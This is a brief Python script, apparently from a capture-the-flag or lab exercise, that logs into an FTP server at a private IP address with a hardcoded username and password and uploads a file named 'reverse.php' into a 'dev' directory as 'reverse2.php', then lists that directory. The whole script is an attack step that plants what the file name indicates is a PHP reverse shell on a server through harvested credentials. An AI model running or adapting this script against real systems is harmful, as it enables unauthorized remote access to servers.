#!/usr/bin/python3

import ftplib
server = ftplib.FTP('10.129.43.85','developer','m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C')

with open('reverse.php','rb') as upload_file:
    server.storbinary('STOR dev/reverse2.php', upload_file)

print (server.dir('dev'))
